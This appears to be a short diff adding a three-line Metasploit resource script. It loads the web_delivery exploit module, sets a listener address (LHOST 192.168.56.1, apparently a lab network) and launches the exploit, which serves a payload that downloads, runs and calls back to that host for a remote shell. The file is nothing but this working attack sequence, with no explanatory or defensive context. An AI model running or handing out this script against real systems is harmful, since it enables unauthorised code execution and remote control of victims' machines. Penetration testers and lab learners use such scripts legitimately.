@@ -1,0 +1,3 @@
+use exploit/multi/script/web_delivery
+set LHOST 192.168.56.1
+exploit
